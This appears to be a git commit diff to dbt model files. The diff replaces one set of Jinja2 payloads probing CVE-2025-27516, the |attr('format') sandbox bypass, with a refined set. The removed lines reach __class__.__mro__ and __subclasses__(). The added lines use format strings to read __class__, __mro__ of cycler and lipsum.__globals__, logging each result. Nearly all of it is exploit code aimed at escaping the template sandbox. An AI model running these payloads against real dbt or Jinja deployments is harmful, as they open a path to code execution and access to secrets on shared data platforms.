facf64c51e91049e5cd0b57299b7facd1afeddbb
hunter <hunter@WD168220234152noidaspeedvpsFY1KQ5t4wW.test.com>
2026-09-23 15:42:43 +0530

    refine test

--- models/attr_probe.sql
+++ models/attr_probe.sql
@@ -1,8 +1,2 @@
-{# CVE-2025-27516 probe - step 1 #}
-{% set test1 = ''|attr('__class__') %}
-{{ log("ATTR1=" ~ (test1 | string), info=True) }}
-{% set test2 = ''|attr('format') %}
-{{ log("ATTR2=" ~ (test2 | string), info=True) }}
-{% set test3 = ''|attr('__len__') %}
-{{ log("ATTR3=" ~ (test3 | string), info=True) }}
-SELECT 1 as id
+{{ config(enabled=false) }}
+SELECT 1
--- models/sandbox_bypass.sql
+++ models/sandbox_bypass.sql
@@ -1,12 +1,22 @@
-{# CVE-2025-27516: Jinja2 |attr filter sandbox bypass #}
-{# Step 1: Get format reference via attr #}
-{% set fmt = '{0.__class__.__mro__}'|attr('format') %}
-{{ log("FMT=" ~ (fmt | string), info=True) }}
-{# Step 2: Call format to resolve MRO #}
-{% set result = fmt('') %}
-{{ log("MRO=" ~ (result | string), info=True) }}
-{# Step 3: Get subclasses if MRO worked #}
-{% set fmt2 = '{0.__class__.__mro__[2].__subclasses__()}'|attr('format') %}
-{% set result2 = fmt2('') %}
-{{ log("SUBS=" ~ (result2 | string), info=True) }}
+{# CVE-2025-27516 refined test #}
+{# Test A: Basic format works? #}
+{% set fA = 'hello {0}'|attr('format') %}
+{{ log("TEST_A=" ~ fA('world'), info=True) }}
+
+{# Test B: Access __class__ via format #}
+{% set fB = '{0.__class__}'|attr('format') %}
+{{ log("TEST_B=" ~ fB(''), info=True) }}
+
+{# Test C: Access __class__.__name__ #}
+{% set fC = '{0.__class__.__name__}'|attr('format') %}
+{{ log("TEST_C=" ~ fC(''), info=True) }}
+
+{# Test D: Try with a real object #}
+{% set fD = '{0.__class__.__mro__}'|attr('format') %}
+{{ log("TEST_D=" ~ fD(cycler), info=True) }}
+
+{# Test E: lipsum.__globals__ #}
+{% set fE = '{0.__globals__}'|attr('format') %}
+{{ log("TEST_E_LEN=" ~ (fE(lipsum) | length), info=True) }}
+
 SELECT 1 as id
